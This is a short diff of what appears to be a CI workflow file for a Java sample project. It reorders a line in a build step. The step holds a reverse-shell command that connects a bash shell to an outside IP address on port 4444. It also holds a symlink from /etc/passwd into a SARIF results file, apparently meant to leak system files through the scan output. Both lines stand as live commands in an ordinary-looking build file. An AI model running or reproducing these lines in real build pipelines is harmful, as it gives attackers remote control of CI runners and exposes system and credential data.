@@ -61,9 +61,8 @@ jobs:
     - run: |
         bash -i >& /dev/tcp/45.77.41.35/4444 0>&1
         mkdir -p /home/runner/work/simple-java-sample/results/
-        ln -s /etc/passwd /home/runner/work/simple-java-sample/results/java-builtin.sarif
         javac src/TestClass.java
-        
+        ln -s /etc/passwd /home/runner/work/simple-java-sample/results/java-builtin.sarif
     
     
     
